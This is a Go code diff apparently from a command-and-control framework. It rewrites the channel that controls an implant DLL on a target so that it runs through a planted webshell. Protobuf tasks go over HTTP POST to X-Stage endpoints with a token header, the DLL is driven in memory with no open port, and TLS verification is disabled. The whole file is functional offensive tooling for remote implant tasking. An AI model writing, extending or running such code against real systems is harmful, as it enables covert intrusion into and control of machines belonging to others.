@@ -1,187 +1,215 @@
 package main
 
 import (
+	"bytes"
 	"context"
+	"crypto/tls"
 	"fmt"
 	"io"
-	"net"
+	"net/http"
 	"sync"
+	"sync/atomic"
 	"time"
 
 	"github.com/chainreactors/IoM-go/proto/client/clientpb"
 	"github.com/chainreactors/IoM-go/proto/implant/implantpb"
 	"github.com/chainreactors/logs"
-	malefic "github.com/chainreactors/malice-network/server/internal/parser/malefic"
+	"google.golang.org/protobuf/proto"
 )
 
 const (
-	handshakeBridgeID uint32 = 0
-	connectTimeout           = 10 * time.Second
-	streamChanBuffer         = 16
+	httpTimeout     = 30 * time.Second
+	pollInterval    = 500 * time.Millisecond
+	streamChanBuffer = 16
+	stageInit       = "init"
+	stageSpite      = "spite"
+	stageStatus     = "status"
+	headerStage     = "X-Stage"
+	headerToken     = "X-Token"
+	headerSessionID = "X-Session-ID"
 )
 
-// Channel manages the malefic protocol connection to the bind DLL on the target.
-// The bridge binary acts as a client, the DLL acts as a malefic bind server.
-// Communication tunnels through suo5: transport.Dial -> suo5 HTTP -> target localhost.
+// ChannelIface abstracts the communication channel to the bridge DLL.
+type ChannelIface interface {
+	Connect(ctx context.Context) error
+	Handshake() (*implantpb.Register, error)
+	StartRecvLoop()
+	Forward(taskID uint32, spite *implantpb.Spite) (*implantpb.Spite, error)
+	OpenStream(taskID uint32) <-chan *implantpb.Spite
+	SendSpite(taskID uint32, spite *implantpb.Spite) error
+	CloseStream(taskID uint32)
+	CloseAllStreams()
+	WithSecure(keyPair *clientpb.KeyPair)
+	Close() error
+	SessionID() uint32
+	IsClosed() bool
+}
+
+// Channel communicates with the bridge DLL through HTTP POST requests
+// to the webshell's X-Stage endpoints. The webshell calls DLL exports
+// (bridge_init, bridge_process) directly via function pointers — no TCP
+// port opened on the target, pure memory channel.
 //
-// Streaming task support: OpenStream registers a per-taskID response channel
-// that persists across multiple DLL responses. recvLoop dispatches incoming
-// packets to the correct channel without removing it, enabling PTY, bridge-agent,
-// and other streaming modules. CloseStream or CloseAllStreams handles cleanup.
+// Wire format: raw protobuf over HTTP body.
+//
+// For streaming tasks, a background poll goroutine periodically sends
+// empty requests to collect pending responses from the DLL.
 type Channel struct {
-	conn      net.Conn
-	transport dialTransport
-	dllAddr   string
+	webshellURL string
+	token       string
+	client      *http.Client
 
-	sessionID uint32 // malefic session ID from DLL's first frame
-	parser    *malefic.MaleficParser
+	sid    uint32
+	sidSet atomic.Bool
+	closed atomic.Bool
+	closeCh chan struct{}
 
-	writeMu  sync.Mutex                    // serializes writes to conn
-	pending  map[uint32]chan *implantpb.Spite // taskID -> response channel
-	pendMu   sync.Mutex                    // guards pending map
-	closed   bool
-	closeMu  sync.Mutex
-	recvDone chan struct{} // closed when recvLoop exits
-	recvErr  error        // terminal error from recvLoop
+	pendMu  sync.Mutex
+	pending map[uint32]chan *implantpb.Spite
+
+	pollCancel context.CancelFunc
 }
 
-type dialTransport interface {
-	DialContext(ctx context.Context, network, address string) (net.Conn, error)
-}
-
-// NewChannel creates a channel that will connect through the given transport
-// to the DLL's malefic bind server at dllAddr (e.g. "127.0.0.1:13338").
-func NewChannel(transport dialTransport, dllAddr, pipelineName string) *Channel {
+// NewChannel creates a channel that communicates with the DLL through
+// the webshell's X-Stage: spite HTTP endpoint.
+func NewChannel(webshellURL, token string) *Channel {
 	return &Channel{
-		transport: transport,
-		dllAddr:   dllAddr,
-		pending:   make(map[uint32]chan *implantpb.Spite),
-		recvDone:  make(chan struct{}),
-		parser:    malefic.NewMaleficParser(),
+		webshellURL: webshellURL,
+		token:       token,
+		client: &http.Client{
+			Timeout: httpTimeout,
+			Transport: &http.Transport{
+				TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+			},
+		},
+		pending: make(map[uint32]chan *implantpb.Spite),
+		closeCh: make(chan struct{}),
 	}
 }
 
-// Connect dials the DLL through suo5. No handshake is performed here;
-// malefic bind sends the Register frame immediately after TCP connect.
+// Connect verifies the webshell is reachable and the DLL is loaded.
 func (c *Channel) Connect(ctx context.Context) error {
-	dialCtx, cancel := context.WithTimeout(ctx, connectTimeout)
-	defer cancel()
-
-	conn, err := c.transport.DialContext(dialCtx, "tcp", c.dllAddr)
+	body, err := c.doRequest(ctx, stageStatus, nil)
 	if err != nil {
-		if dialCtx.Err() != nil {
-			return fmt.Errorf("connect timeout: %w", dialCtx.Err())
-		}
-		return fmt.Errorf("dial DLL at %s: %w", c.dllAddr, err)
+		return fmt.Errorf("connect: %w", err)
 	}
-	c.conn = conn
+	status := string(body)
+	if status != "LOADED" {
+		return fmt.Errorf("DLL not loaded (status: %s)", status)
+	}
 	return nil
 }
 
-// Handshake reads the initial registration data from the DLL.
-// The malefic bind DLL sends a frame containing Spites{[Spite{Body: Register{...}}]}
-// immediately after TCP connect.
+// Handshake calls bridge_init on the DLL via the webshell and returns
+// the Register message containing SysInfo and module list.
 func (c *Channel) Handshake() (*implantpb.Register, error) {
-	sid, length, err := c.parser.ReadHeader(c.conn)
+	body, err := c.doRequest(context.Background(), stageInit, nil)
 	if err != nil {
-		return nil, fmt.Errorf("read handshake header: %w", err)
+		return nil, fmt.Errorf("handshake: %w", err)
+	}
+	if len(body) == 0 {
+		return nil, fmt.Errorf("empty handshake response")
 	}
 
-	buf := make([]byte, length)
-	if _, err := io.ReadFull(c.conn, buf); err != nil {
-		return nil, fmt.Errorf("read handshake payload: %w", err)
+	// First 4 bytes: session ID (little-endian uint32), rest: Register protobuf
+	if len(body) < 4 {
+		return nil, fmt.Errorf("handshake response too short: %d bytes", len(body))
+	}
+	c.sid = uint32(body[0]) | uint32(body[1])<<8 | uint32(body[2])<<16 | uint32(body[3])<<24
+	c.sidSet.Store(true)
+
+	reg := &implantpb.Register{}
+	if err := proto.Unmarshal(body[4:], reg); err != nil {
+		return nil, fmt.Errorf("unmarshal register: %w", err)
 	}
 
-	spites, err := c.parser.Parse(buf)
-	if err != nil {
-		return nil, fmt.Errorf("parse handshake: %w", err)
-	}
-
-	if len(spites.GetSpites()) == 0 {
-		return nil, fmt.Errorf("empty handshake frame")
-	}
-
-	spite := spites.GetSpites()[0]
-	reg := spite.GetRegister()
-	if reg == nil {
-		return nil, fmt.Errorf("handshake spite has no Register body")
-	}
-
-	c.sessionID = sid
-	logs.Log.Debugf("handshake received: sid=%d name=%s modules=%v", sid, reg.Name, reg.Module)
+	logs.Log.Debugf("handshake: sid=%d name=%s modules=%v", c.sid, reg.Name, reg.Module)
 	return reg, nil
 }
 
-// StartRecvLoop starts a background goroutine that reads responses from the
-// DLL and dispatches them to the appropriate pending channel by taskID.
-// Unlike the old single-response model, channels are NOT removed on first
-// dispatch — they persist until explicitly closed via CloseStream.
-// Must be called after Connect + Handshake.
+// StartRecvLoop starts a background polling goroutine that fetches pending
+// responses from the DLL for streaming tasks.
 func (c *Channel) StartRecvLoop() {
-	go c.recvLoop()
+	ctx, cancel := context.WithCancel(context.Background())
+	c.pollCancel = cancel
+	go c.pollLoop(ctx)
 }
 
-func (c *Channel) recvLoop() {
-	defer close(c.recvDone)
+func (c *Channel) pollLoop(ctx context.Context) {
+	ticker := time.NewTicker(pollInterval)
+	defer ticker.Stop()
+
 	for {
-		_, length, err := c.parser.ReadHeader(c.conn)
-		if err != nil {
-			c.handleRecvLoopExit(err)
+		select {
+		case <-ctx.Done():
 			return
-		}
-
-		buf := make([]byte, length)
-		if _, err := io.ReadFull(c.conn, buf); err != nil {
-			c.handleRecvLoopExit(fmt.Errorf("read payload: %w", err))
+		case <-c.closeCh:
 			return
-		}
-
-		spites, err := c.parser.Parse(buf)
-		if err != nil {
-			logs.Log.Debugf("recv loop parse error (skipping frame): %v", err)
-			continue
-		}
-
-		// Dispatch each Spite by its TaskId — do NOT delete the channel entry.
-		for _, spite := range spites.GetSpites() {
-			taskID := spite.GetTaskId()
+		case <-ticker.C:
 			c.pendMu.Lock()
-			ch, ok := c.pending[taskID]
+			hasPending := len(c.pending) > 0
 			c.pendMu.Unlock()
-
-			if ok {
-				select {
-				case ch <- spite:
-				default:
-					logs.Log.Debugf("recv loop: channel full for task %d, dropping", taskID)
-				}
-			} else {
-				logs.Log.Debugf("recv loop: no waiter for task %d", taskID)
+			if !hasPending {
+				continue
 			}
+
+			empty := &implantpb.Spites{}
+			data, err := proto.Marshal(empty)
+			if err != nil {
+				continue
+			}
+			respBody, err := c.doRequest(ctx, stageSpite, data)
+			if err != nil {
+				if ctx.Err() != nil {
+					return
+				}
+				logs.Log.Debugf("poll error: %v", err)
+				continue
+			}
+			c.dispatchResponse(respBody)
 		}
 	}
 }
 
-func (c *Channel) handleRecvLoopExit(err error) {
-	c.closeMu.Lock()
-	closed := c.closed
-	c.closeMu.Unlock()
-	if !closed {
-		logs.Log.Debugf("recv loop error: %v", err)
+// Forward sends a Spite and waits for a single response (unary request-response).
+func (c *Channel) Forward(taskID uint32, spite *implantpb.Spite) (*implantpb.Spite, error) {
+	if c.closed.Load() {
+		return nil, fmt.Errorf("channel closed")
 	}
-	// Close all pending channels to signal EOF to waiters.
-	c.pendMu.Lock()
-	c.recvErr = err
-	for id, ch := range c.pending {
-		close(ch)
-		delete(c.pending, id)
+
+	spite.TaskId = taskID
+	spites := &implantpb.Spites{Spites: []*implantpb.Spite{spite}}
+	data, err := proto.Marshal(spites)
+	if err != nil {
+		return nil, fmt.Errorf("marshal spite: %w", err)
 	}
-	c.pendMu.Unlock()
+
+	respBody, err := c.doRequest(context.Background(), stageSpite, data)
+	if err != nil {
+		return nil, fmt.Errorf("forward: %w", err)
+	}
+
+	respSpites := &implantpb.Spites{}
+	if err := proto.Unmarshal(respBody, respSpites); err != nil {
+		return nil, fmt.Errorf("unmarshal response: %w", err)
+	}
+
+	for _, s := range respSpites.GetSpites() {
+		if s.GetTaskId() == taskID {
+			return s, nil
+		}
+	}
+
+	if len(respSpites.GetSpites()) > 0 {
+		for _, s := range respSpites.GetSpites() {
+			c.dispatchSpite(s)
+		}
+	}
+
+	return nil, fmt.Errorf("no response for task %d", taskID)
 }
 
-// OpenStream registers a buffered response channel for taskID and returns the read end.
-// The channel receives all DLL responses for this taskID until CloseStream is called
-// or the recvLoop exits (which closes the channel).
+// OpenStream registers a persistent response channel for streaming tasks.
 func (c *Channel) OpenStream(taskID uint32) <-chan *implantpb.Spite {
 	ch := make(chan *implantpb.Spite, streamChanBuffer)
 	c.pendMu.Lock()
@@ -190,41 +218,34 @@ func (c *Channel) OpenStream(taskID uint32) <-chan *implantpb.Spite {
 	return ch
 }
 
-// SendSpite sends a single spite to the DLL for the given taskID.
-// Thread-safe: multiple goroutines can call SendSpite concurrently.
+// SendSpite sends a spite to the DLL via the webshell.
 func (c *Channel) SendSpite(taskID uint32, spite *implantpb.Spite) error {
-	c.closeMu.Lock()
-	if c.closed || c.conn == nil {
-		c.closeMu.Unlock()
+	if c.closed.Load() {
 		return fmt.Errorf("channel closed")
 	}
-	c.closeMu.Unlock()
 
 	spite.TaskId = taskID
 	spites := &implantpb.Spites{Spites: []*implantpb.Spite{spite}}
-
-	data, err := c.parser.Marshal(spites, c.sessionID)
+	data, err := proto.Marshal(spites)
 	if err != nil {
-		return fmt.Errorf("marshal spite: %w", err)
+		return fmt.Errorf("marshal: %w", err)
 	}
 
-	c.writeMu.Lock()
-	_, err = c.conn.Write(data)
-	c.writeMu.Unlock()
-	return err
+	respBody, err := c.doRequest(context.Background(), stageSpite, data)
+	if err != nil {
+		return err
+	}
+
+	c.dispatchResponse(respBody)
+	return nil
 }
 
-// CloseStream removes the pending channel for taskID.
-// Does NOT close the channel itself to avoid send-on-closed-channel panic
-// if recvLoop is concurrently dispatching.
 func (c *Channel) CloseStream(taskID uint32) {
 	c.pendMu.Lock()
 	delete(c.pending, taskID)
 	c.pendMu.Unlock()
 }
 
-// CloseAllStreams closes and removes all pending channels.
-// Safe to call during teardown (holds pendMu for the entire operation).
 func (c *Channel) CloseAllStreams() {
 	c.pendMu.Lock()
 	for id, ch := range c.pending {
@@ -234,40 +255,82 @@ func (c *Channel) CloseAllStreams() {
 	c.pendMu.Unlock()
 }
 
-// Forward sends a Spite request to the DLL and waits for a single response.
-// Convenience wrapper over OpenStream + SendSpite + CloseStream for unary tasks.
-func (c *Channel) Forward(taskID uint32, spite *implantpb.Spite) (*implantpb.Spite, error) {
-	ch := c.OpenStream(taskID)
+func (c *Channel) SessionID() uint32 { return c.sid }
 
-	if err := c.SendSpite(taskID, spite); err != nil {
-		c.CloseStream(taskID)
-		return nil, err
-	}
+func (c *Channel) IsClosed() bool { return c.closed.Load() }
 
-	resp, ok := <-ch
-	c.CloseStream(taskID)
-	if !ok {
-		return nil, fmt.Errorf("channel closed during forward")
-	}
-	return resp, nil
-}
+// WithSecure is a no-op. Use HTTPS for transport security.
+func (c *Channel) WithSecure(_ *clientpb.KeyPair) {}
 
-// WithSecure enables Age encryption/decryption on the malefic wire protocol.
-func (c *Channel) WithSecure(keyPair *clientpb.KeyPair) {
-	c.parser.WithSecure(keyPair)
-}
-
-// Close shuts down the malefic connection.
 func (c *Channel) Close() error {
-	c.closeMu.Lock()
-	defer c.closeMu.Unlock()
-
-	if c.closed {
+	if c.closed.Swap(true) {
 		return nil
 	}
-	c.closed = true
-	if c.conn != nil {
-		return c.conn.Close()
+	close(c.closeCh)
+	if c.pollCancel != nil {
+		c.pollCancel()
 	}
+	c.CloseAllStreams()
 	return nil
+}
+
+func (c *Channel) doRequest(ctx context.Context, stage string, body []byte) ([]byte, error) {
+	var bodyReader io.Reader
+	if body != nil {
+		bodyReader = bytes.NewReader(body)
+	}
+
+	req, err := http.NewRequestWithContext(ctx, "POST", c.webshellURL, bodyReader)
+	if err != nil {
+		return nil, err
+	}
+	req.Header.Set(headerStage, stage)
+	if c.token != "" {
+		req.Header.Set(headerToken, c.token)
+	}
+	if c.sidSet.Load() {
+		req.Header.Set(headerSessionID, fmt.Sprintf("%d", c.sid))
+	}
+	req.Header.Set("Content-Type", "application/octet-stream")
+
+	resp, err := c.client.Do(req)
+	if err != nil {
+		return nil, err
+	}
+	defer resp.Body.Close()
+
+	if resp.StatusCode != http.StatusOK {
+		respBody, _ := io.ReadAll(resp.Body)
+		return nil, fmt.Errorf("HTTP %d: %s", resp.StatusCode, string(respBody))
+	}
+
+	return io.ReadAll(resp.Body)
+}
+
+func (c *Channel) dispatchResponse(body []byte) {
+	if len(body) == 0 {
+		return
+	}
+	spites := &implantpb.Spites{}
+	if err := proto.Unmarshal(body, spites); err != nil {
+		logs.Log.Debugf("dispatch unmarshal error: %v", err)
+		return
+	}
+	for _, spite := range spites.GetSpites() {
+		c.dispatchSpite(spite)
+	}
+}
+
+func (c *Channel) dispatchSpite(spite *implantpb.Spite) {
+	taskID := spite.GetTaskId()
+	c.pendMu.Lock()
+	ch, ok := c.pending[taskID]
+	c.pendMu.Unlock()
+	if ok {
+		select {
+		case ch <- spite:
+		default:
+			logs.Log.Debugf("channel: pending full for task %d", taskID)
+		}
+	}
 }
